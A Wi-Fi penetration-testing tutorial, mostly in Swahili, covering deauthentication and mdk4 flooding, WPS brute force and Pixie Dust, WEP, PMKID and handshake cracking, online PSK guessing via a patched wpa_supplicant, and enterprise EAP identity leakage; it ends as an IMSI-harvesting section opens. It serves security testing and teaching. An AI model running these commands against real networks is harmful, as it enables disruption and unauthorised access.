# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi amri za msingi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Zana

### Hijacker & NexMon (Wi-Fi ya ndani ya Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Endesha airgeddon na docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Inaweza kufanya mashambulizi ya Evil Twin, KARMA, na Known Beacons kisha kutumia template ya phishing ili kufanikiwa kupata nywila halisi ya mtandao au kunasa maelezo ya kuingia ya mitandao ya kijamii.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Zana hii inaotomatisha mashambulizi ya **WPS/WEP/WPA-PSK**. Zitafanya yafuatayo moja kwa moja:

- Weka kiolesura katika monitor mode
- Skana mitandao inayowezekana - na ikuruhusu kuchagua waathirika
- Ikiwa WEP - anzisha mashambulizi ya WEP
- Ikiwa WPA-PSK
- Ikiwa WPS: Pixie dust attack na brute-force attack (kuwa mwangalifu, brute-force attack inaweza kuchukua muda mrefu). Kumbuka haitajaribu null PIN au database/generated PINs.
- Jaribu kukamata PMKID kutoka AP ili ku-crack
- Jaribu ku-deauthenticate wateja wa AP ili kukamata handshake
- Ikiwa PMKID au Handshake, jaribu ku-bruteforce ukitumia top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Kutenganisha kila mtu (au ESSID/Client maalum)
- Random fake APs -- Ficha mitandao, inaweza kuharibu scanners
- Overload AP -- Jaribu kuifanya AP isifanye kazi (kawaida si ya msaada sana)
- WIDS -- Cheza na IDS
- TKIP, EAPOL -- Baadhi ya mashambulizi maalum ya kufanya DoS kwa baadhi ya APs
- **Cracking**
- Crack **WEP** (several tools and methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (kwa au bila DoS)
- **Open** Evil Twin \[+ DoS] -- Inafaa kukamata captive portal creds na/au kufanya mashambulizi ya LAN
- **WPA-PSK** Evil Twin -- Inafaa kwa network attacks ikiwa unajua password
- **WPA-MGT** -- Inafaa kukamata company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Inafaa kukamata captive portal creds na/au kufanya mashambulizi ya LAN
- **+ WPA** -- Inafaa kukamata WPA handshakes

## Open / OWE networks quick notes

- **Passive capture** on open SSIDs bado inafanya kazi na monitor mode na tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) hufanya per-station key exchange (no PSK), hivyo air frames zimefichwa hata kwenye "open" SSIDs. Kwa kuwa inategemea WPA3, pia inatekeleza **802.11w PMF**, ambayo inazuia spoofed deauth/disassoc frames.
- OWE **does not authenticate** joiners: mtu yoyote anaweza associate, hivyo **verify client isolation** badala ya kuamini dai za uuzaji. Bila isolation, ARP spoofing au responder-style poisoning kwenye L2 ya ndani bado inafanya kazi.
- **Evil Twin** bado inawezekana kwenye open/OWE SSIDs kwa kuwasilisha signal yenye nguvu zaidi; PMF inachukua tu njia fupi ya deauth. Ikiwa victims watakubali forged TLS cert, full HTTP(S) MitM inapatikana tena.
- Broadcast poisoning kwenye open guest Wi-Fi kwa urahisi hutoa creds/hashes (LLMNR/NBT-NS/mDNS). See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, njia inayotumika sana katika Wi-Fi hacking, zinahusisha kughushi "management" frames ili **forcefully disconnect devices from a network**. Hizi unencrypted packets zinaudanganya clients kuwaza zinatoka kwenye mtandao halali, na kutoa uwezo kwa attackers kukusanya WPA handshakes kwa shughuli za cracking au kuendelea kuvuruga network connections. Taktiki hii, inayotia wasiwasi kwa ugumu wake, inatumiwa sana na ina athari kubwa kwa usalama wa mtandao.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 inamaanisha deauthentication
- 1 ni idadi ya deauths za kutuma (unaweza kutuma nyingi ikiwa unataka); 0 inamaanisha uzitume kwa mfululizo
- -a 00:14:6C:7E:40:80 ni anwani ya MAC ya access point
- -c 00:0F:B5:34:30:30 ni anwani ya MAC ya client ambayo itafanywa deauthenticate; ikiwa hii itaachwa basi broadcast deauthentication itatumwa (haifanyi kazi kila wakati)
- ath0 ni jina la interface

### Disassociation Packets

**Disassociation packets**, sawa na deauthentication packets, ni aina ya management frame zinazotumika katika mitandao ya Wi-Fi. Vipaketi hivi vinatumika kuvunja muunganisho kati ya kifaa (kama laptop au smartphone) na access point (AP). Tofauti kuu kati ya disassociation na deauthentication iko katika mazingira ya matumizi yao. Wakati AP hutuma **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart, or relocating, thereby necessitating the disconnection of all connected nodes.

**Shambulio hili linaweza kufanywa kwa mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Zaidi DOS attacks na mdk4**

**Kwenye** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Inatuma beacon frames ili kuonyesha fake APs kwa clients. Hii inaweza wakati mwingine kusababisha crash ya network scanners na hata drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Kutumiza authentication frames kwa Access Points (APs) zote zinazopatikana ndani ya umbali kunaweza kuzidisha mzigo kwenye APs hizi, hasa wakati wateja wengi wanahusika. Trafiki hii nyingi inaweza kusababisha kutokuwa imara kwa mfumo, na kusababisha baadhi ya APs kusimama au hata kurudishwa upya.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Kupima Access Points (APs) huangalia kama SSID inaonyeshwa ipasavyo na kuthibitisha anuwai ya AP. Teknika hii, ikishirikiana na **bruteforcing hidden SSIDs** kwa kutumia au bila wordlist, husaidia kutambua na kupata mitandao iliyofichwa.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Kutuma vifurushi vya nasibu au nakala kwa safu tofauti za QoS kunaweza kuchochea Michael Countermeasures kwenye **TKIP APs**, ikisababisha AP kuzimwa kwa dakika moja. Njia hii ni mbinu yenye ufanisi ya shambulio la **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Kumwaga AP kwa **EAPOL Start frames** huunda **fake sessions**, huweka AP chini ya mzigo na kuzuia wateja halali. Vinginevyo, kuingiza **fake EAPOL Logoff messages** kunawatenganisha wateja kwa nguvu; mbinu zote mbili huvuruga huduma ya mtandao kwa ufanisi.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

Mashambulizi mbalimbali dhidi ya usimamizi wa viungo na routing katika mitandao ya mesh.

**ATTACK MODE w: WIDS Confusion**

Kuunganisha wateja kwa njia ya msalaba na nodes nyingi za WDS au fake rogue APs kunaweza kudanganya Intrusion Detection and Prevention Systems, kuleta mchanganyiko na uwezekano wa matumizi mabaya ya mfumo.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

A packet fuzzer featuring diverse packet sources and a comprehensive set of modifiers for packet manipulation.

### **Airggedon**

_**Airgeddon**_ inatoa sehemu kubwa ya attacks zilizopendekezwa katika maelezo yaliyotangulia:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) inarahisisha mchakato wa kuunganisha vifaa kwenye router, ikiongeza kasi na urahisi wa setup kwa networks zilizofichwa kwa **WPA** au **WPA2** Personal. Haiwafi kwa usalama wa **WEP** unaovamiwa kwa urahisi. WPS inatumia PIN ya tarakimu 8, ambayo inathibitishwa kwa nusu mbili, jambo linalofanya iwe rahisi kwa brute-force attacks kutokana na idadi ndogo ya mchanganyiko (uwezekano 11,000).

### WPS Bruteforce

Kuna zana kuu 2 za kufanya kitendo hiki: Reaver na Bully.

- **Reaver** imeundwa kuwa attack thabiti na ya vitendo dhidi ya WPS, na imethibitishwa dhidi ya aina mbalimbali za access points na implementations za WPS.
- **Bully** ni **new implementation** ya WPS brute force attack, imeandikwa kwa C. Ina faida kadhaa juu ya original reaver code: utegemezi mdogo, utendaji ulioboreshwa wa memory na cpu, utunzaji sahihi wa endianness, na seti ya chaguzi zenye nguvu zaidi.

Shambulio linatumia udhaifu wa WPS PIN, hasa kufichuka kwa tarakimu nne za kwanza na jukumu la tarakimu ya mwisho kama checksum, jambo linalorahisisha brute-force attack. Hata hivyo, ulinzi dhidi ya brute-force attacks, kama kuzuia MAC addresses za washambuliaji wakali, huhitaji MAC address rotation ili kuendelea na shambulio.

Baada ya kupata WPS PIN kwa kutumia zana kama Bully au Reaver, mshambuliaji anaweza kubaini **WPA/WPA2 PSK**, akihakikisha **ufikiaji wa mtandao wa kudumu**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Mbinu hii iliyoboreshwa inalenga WPS PINs kwa kutumia udhaifu uliyojulikana:

1. **PINs zilizogunduliwa awali**: Tumia hifadhidata ya PINs zilizojulikana zinazohusishwa na watengenezaji maalum wanaojulikana kutumia WPS PINs zinazofanana. Hifadhidata hii inaunganisha octet tatu za kwanza za MAC-addresses na PINs zinazowezekana kwa watengenezaji hao.
2. **Algoritimu za uzalishaji PIN**: Tumia algoritimu kama ComputePIN na EasyBox, ambazo hutoa WPS PINs kulingana na MAC-address ya AP. Algorithm ya Arcadyan pia inahitaji device ID, ikiongeza tabaka kwenye mchakato wa uzalishaji wa PIN.

### WPS Pixie Dust attack

**Dominique Bongard** aligundua kasoro katika baadhi ya Access Points (APs) kuhusu uundaji wa misimbo ya siri, inayojulikana kama **nonces** (**E-S1** na **E-S2**). Ikiwa nonces hizi zinaweza kugunduliwa, cracking ya WPS PIN ya AP inakuwa rahisi. AP inaonyesha PIN ndani ya msimbo maalum (hash) kuthibitisha kuwa ni halali na sio fake (rogue) AP. Nonces hizi kwa msingi ni "keys" za kufungua "safe" inayoshikilia WPS PIN. Tazama zaidi [hapa](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Kwa maneno rahisi, tatizo ni kwamba baadhi ya APs hazikutumia keys za kutosha nasibu kwa ajili ya encrypting PIN wakati wa mchakato wa kuunganishwa. Hii inafanya PIN kuwa nyeti kwa kukadiriwa kutoka nje ya mtandao (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Ikiwa hutaki kubadili kifaa hadi monitor mode, au `reaver` na `bully` zinapata shida, unaweza kujaribu [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Zana hii inaweza kutekeleza Pixie Dust attack bila ya kuhamisha hadi monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Baadhi ya mifumo iliyoundwa vibaya hata huwaruhusu **Null PIN** (PIN tupu au isiyokuwepo) kupewa ufikiaji, jambo ambalo ni la ajabu sana. Chombo **Reaver** kina uwezo wa kujaribu udhaifu huu, tofauti na **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 zinakuwezesha kujaribu **PIN yako maalum** (ikiwa unayo)
- 7 and 8 hufanya **Pixie Dust attack**
- 13 inakuwezesha kujaribu **NULL PIN**
- 11 and 12 zitakusanya **PINs zinazohusiana na AP iliyochaguliwa kutoka kwenye databases zinazopatikana** na **tengeneza** PINs zinazowezekana kwa kutumia: ComputePIN, EasyBox na kwa hiari Arcadyan (inashauriwa, kwa nini si?)
- 9 and 10 zitajaribu **kila PIN inayowezekana**

## **WEP**

**Kwa nini inashindwa**

- RC4 seed ni tu **IV (24 bits) + shared key**. IV ni cleartext, ndogo (2^24), na hurudia haraka, hivyo ciphertexts zenye IV sawa zinatumia tena keystream.
- Kufanya XOR kati ya ciphertexts mbili zenye keystream sawa leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) hukuruhusu “vote” key bytes. **PTW** huboresha hili kwa kutumia trafiki ya ARP kupunguza mahitaji hadi mamia elfu ya packets badala ya mamilioni.
- Uadilifu ni tu **CRC32** (linear/unkeyed), hivyo mshambuliaji anaweza kubadilisha bits na kuhesabu tena CRC32 bila key → packet forgery/replay/ARP injection wakati akisubiri IVs.

Uvunjaji wa vitendo ni deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon bado inatoa "All-in-One" WEP workflow ikiwa unapendelea UI iliyoongozwa.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

Mnamo 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) njia mpya ya shambulio, ya kipekee kwa sababu inahitaji tu **paketi moja tu** na haitahitaji wateja wowote kuunganishwa na AP lengwa—ni mwingiliano kati ya mshambuliaji na AP tu.

Router nyingi za kisasa zinaongeza **uwanja wa hiari** kwenye **first EAPOL** frame wakati wa association, unaojulikana kama `Robust Security Network`. Hii inajumuisha `PMKID`.

Kama chapisho la asili linavyoeleza, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Kuzingatia kwamba "PMK Name" ni thabiti, tunajua BSSID ya AP na station, na `PMK` ni sawa na ile kutoka kwa 4-way handshake kamili, **hashcat** inaweza kutumia taarifa hii kuvunja PSK na kurejesha passphrase!

Ili **gather** taarifa hizi na **bruteforce** nenosiri kwa kienyeji unaweza kufanya:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** zitaonyeshwa kwenye **console** na pia **zitahifadhiwa** ndani ya \_ **/tmp/attack.pcap**\_\
Sasa, badilisha capture kuwa muundo wa **hashcat/john** na crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Tafadhali kumbuka muundo wa hash sahihi una **4 sehemu**, kama: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Ikiwa yako **tu** ina **3 sehemu**, basi ni **batili** (urekodi wa PMKID haukuwa sahihi).

Tambua kwamba `hcxdumptool` **pia inarekodi handshakes** (kitu kama hiki kitaonekana: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Unaweza **badilisha** **handshakes** hadi muundo wa **hashcat**/**john** kwa kutumia `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Nimegundua kwamba baadhi ya handshakes zilizokamatwa kwa kutumia tool hii hazikuweza ku-crack hata nikiwa najua password sahihi. Ninapendekeza kukamata handshakes pia kwa njia za jadi ikiwa inawezekana, au kukamata kadhaa kwa kutumia tool hii._

### Kukamata handshake

Shambulio dhidi ya **WPA/WPA2** networks linaweza kufanywa kwa kukamata **handshake** na kujaribu ku-**crack** password **offline**. Mchakato huu unahusisha kufuatilia mawasiliano ya mtandao maalum na **BSSID** kwenye **channel** fulani. Hapa kuna mwongozo mfupi:

1. Tambua **BSSID**, **channel**, na **connected client** wa mtandao lengwa.
2. Tumia `airodump-ng` kufuatilia trafiki ya mtandao kwenye **channel** na **BSSID** zilizotajwa, ukitarajia kukamata **handshake**. Amri itaonekana kama ifuatavyo:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Ili kuongeza nafasi ya kukamata handshake, kata mteja kutoka kwenye mtandao kwa muda mfupi ili kumlazimisha kuthibitishwa tena. Hili linaweza kufanywa kwa kutumia amri ya `aireplay-ng`, ambayo inatuma deauthentication packets kwa mteja:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Kumbuka kwamba kwa kuwa mteja alikuwa deauthenticated, inaweza kujaribu kuungana na AP tofauti au, katika kesi nyingine, na mtandao tofauti._

Mara tu taarifa za handshake zinapoonekana katika `airodump-ng`, hii inamaanisha kwamba handshake imekaptiwa na unaweza kuacha kusikiliza:

![](<../../images/image (172) (1).png>)

Mara handshake imekaptiwa, unaweza **crack** kwa kutumia `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Angalia ikiwa handshake iko kwenye faili

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Ikiwa zana hii inapata handshake isiyokamilika ya ESSID kabla ya ile iliyokamilika, haitagundua ile halali._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Kubashiri PSK mtandaoni kwa kasi zaidi kupitia `wpa_supplicant` ctrl socket (no clients/PMKID)

Wakati hakuna clients karibu na AP inakataa PMKID, unaweza kupitia PSKs mtandaoni bila kurudia kuanzisha supplicants:

- Patch `wpa_supplicant.c` ili kulazimisha `dur = 0;` katika auth failure backoff logic (kando ya `ssid->auth_failures`), kwa ufanisi kuzima timer ya temporary-disable.
- Endesha daemon moja na control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Endesha kupitia control interface, ukitumia tena scan na network ile ile:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Mzunguko mdogo wa Python unaosoma matukio ya socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) unaweza kujaribu ~100 makisia kwa takriban dakika 5 bila mzigo wa skani. Bado inasababisha kelele na inaweza kugunduliwa, lakini inazuia kuanzisha upya mchakato kwa kila jaribio na backoff delays.

## **WPA Enterprise (MGT)**

Katika **mipangilio ya WiFi ya enterprise, utakutana na mbinu mbalimbali za uthibitishaji**, kila moja ikitoa viwango tofauti vya usalama na sifa za usimamizi. Unapotumia zana kama `airodump-ng` kuchunguza trafiki ya mtandao, unaweza kuona vitambulisho vya aina hizi za uthibitishaji. Baadhi ya mbinu za kawaida ni pamoja na:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Njia hii inasaidia hardware tokens na one-time passwords ndani ya EAP-PEAP. Tofauti na MSCHAPv2, haifanyi peer challenge na inatuma passwords kama maandishi wazi kwa access point, ikiweka hatari kwa downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Inajumuisha kutuma MD5 hash ya password kutoka kwa client. Haipendekezwi kwa sababu inaweza kushambuliwa kwa dictionary attacks, hauna server authentication, na hawezi kuzalisha WEP keys maalum za session.
3. **EAP-TLS (Transport Layer Security)**:
- Inatumia certificates upande wa client na server kwa authentication na inaweza kuzalisha kwa nguvu WEP keys za user-based na session-based kwa kulinda mawasiliano.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Inatoa mutual authentication kupitia tunnel iliyosimbwa, pamoja na njia ya kutengeneza dynamic, per-user, per-session WEP keys. Inahitaji certificates za upande wa server pekee, na clients hutumia credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Inafanya kazi kwa njia sawa na EAP kwa kuunda TLS tunnel kwa mawasiliano yaliyolindwa. Hii inaruhusu matumizi ya weaker authentication protocols juu ya EAP kwa sababu ya ulinzi wa tunnel.
- **PEAP-MSCHAPv2**: Mara nyingi huitwa PEAP, inaunganisha mekanismi dhaifu ya MSCHAPv2 challenge/response na TLS tunnel ya ulinzi.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Sawa na EAP-TLS lakini huanzisha TLS tunnel kabla ya kubadilishana certificates, ikitoa safu nyingine ya usalama.

Unaweza kupata taarifa zaidi kuhusu njia hizi za authentication [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Kukamata username

Ukisoma [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) inaonekana kuwa ikiwa unatumia **EAP** ujumbe za **"Identity"** lazima ziunge mkono, na **username** itatumwa **wazi** katika ujumbe za **"Response Identity"**.

Hata ukitumia moja ya mbinu salama zaidi za authentication: **PEAP-EAP-TLS**, inawezekana **kukamata username inayotumwa katika protokoli ya EAP**. Ili kufanya hivyo, **kamata mawasiliano ya authentication** (anzisha `airodump-ng` ndani ya channel na `wireshark` katika interface ileile) na filter packets kwa`eapol`.\  
Ndani ya kifurushi cha "**Response, Identity**", **username** ya client itaonekana.

![](<../../images/image (850).png>)

### Utambulisho Binafsi (Anonymous Identities)

Kuficha utambulisho kunasaidiwa na EAP-PEAP na EAP-TTLS. Katika muktadha wa mtandao wa WiFi, ombi la EAP-Identity kawaida linaanzishwa na access point (AP) wakati wa mchakato wa association. Ili kuhakikisha ulinzi wa anonimity ya mtumiaji, jibu kutoka kwa EAP client kwenye kifaa cha mtumiaji linajumuisha tu taarifa muhimu zinazohitajika kwa server ya RADIUS ya awali kushughulikia ombi. Dhana hii inaonyeshwa kupitia matukio yafuatayo:

- EAP-Identity = anonymous
- Katika tukio hili, watumiaji wote wanatumia jina bandia "anonymous" kama kitambulisho chao cha mtumiaji. initial RADIUS server hufanya kazi kama EAP-PEAP au EAP-TTLS server, ikiwa juu ya kusimamia sehemu ya server ya itifaki ya PEAP au TTLS. Mbinu ya ndani (iliyoilindwa) ya authentication kisha inashughulikiwa kwa ndani au kupelekwa kwa remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- Katika hali hii, watumiaji kutoka realms tofauti wanaficha utambulisho wao huku wakionyesha realms zao. Hii inaruhusu initial RADIUS server ku-proxy maombi ya EAP-PEAP au EAP-TTLS kwa RADIUS servers katika realm zao za nyumbani, ambazo zinatenda kama PEAP au TTLS server. initial RADIUS server inafanya kazi kama node ya relay ya RADIUS tu.
- Vinginevyo, initial RADIUS server inaweza kufanya kazi kama EAP-PEAP au EAP-TTLS server na kushughulikia mbinu ya authentication iliyoilindwa au kuituma kwa server nyingine. Chaguo hili hurahisisha kusanidi sera tofauti kwa realms mbalimbali.

Katika EAP-PEAP, mara tu tunnel ya TLS itakapojengwa kati ya PEAP server na PEAP client, PEAP server huanzisha ombi la EAP-Identity na kuutuma kupitia TLS tunnel. Client inajibu ombi hili la pili la EAP-Identity kwa kutuma jibu la EAP-Identity linalojumuisha utambulisho halisi wa mtumiaji kupitia tunnel iliyosimbwa. Njia hii inazuia kwa ufanisi ufichuzi wa utambulisho halisi wa mtumiaji kwa mtu yeyote anayeweza kusikiliza trafiki ya 802.11.

EAP-TTLS inafuata utaratibu kidogo tofauti. Kwa EAP-TTLS, client kwa kawaida inathibitisha kwa kutumia PAP au CHAP, zikilindwa na TLS tunnel. Katika kesi hii, client inajumuisha attribute ya User-Name na ama Password au CHAP-Password katika ujumbe wa kwanza wa TLS unaotumwa baada ya kuanzishwa kwa tunnel.

Bila kujali protokoli iliyochaguliwa, server ya PEAP/TTLS hupata utambulisho halisi wa mtumiaji baada ya TLS tunnel kujengwa. Utambulisho halisi unaweza kuwakilishwa kama user@realm au user pekee. Ikiwa PEAP/TTLS server pia ndiye anayeweka wasifu wa mtumiaji, sasa anamiliki utambulisho wa mtumiaji na anaendelea na mbinu ya authentication iliyolindwa na TLS tunnel. Vinginevyo, PEAP/TTLS server inaweza kupeleka ombi jipya la RADIUS kwa home RADIUS server ya mtumiaji. Ombi jipya la RADIUS halijumuishi safu ya PEAP au TTLS. Katika matukio ambapo mbinu iliyoilindwa ya authentication ni EAP, ujumbe wa ndani wa EAP hutumwa kwa home RADIUS server bila kifuniko cha EAP-PEAP au EAP-TTLS. Attribute ya User-Name ya ujumbe wa RADIUS unaotoka inaweka utambulisho halisi wa mtumiaji, ikichukua nafasi ya User-Name ya anonymous kutoka kwa ombi la RADIUS lilioingia. Wakati mbinu iliyoilindwa ya authentication ni PAP au CHAP (inayoungwa mkono tu na TTLS), User-Name na attributes nyingine za authentication zilizotolewa kutoka kwa TLS payload zinachukuliwa na kuwekwa katika ujumbe wa RADIUS unaotumwa, zikichukua nafasi ya User-Name ya anonymous na attributes za TTLS EAP-Message zilizopo katika ombi la RADIUS lilioingia.

Kwa habari zaidi angalia [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication kwa kutumia EAP‑SIM/EAP‑AKA juu ya 802.1X inaweza leak permanent subscriber identifier (IMSI) kwa cleartext wakati wa hatua ya unauthenticated identity ikiwa deployment haitekelezi pseudonyms/protected identities au TLS tunnel karibu na inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
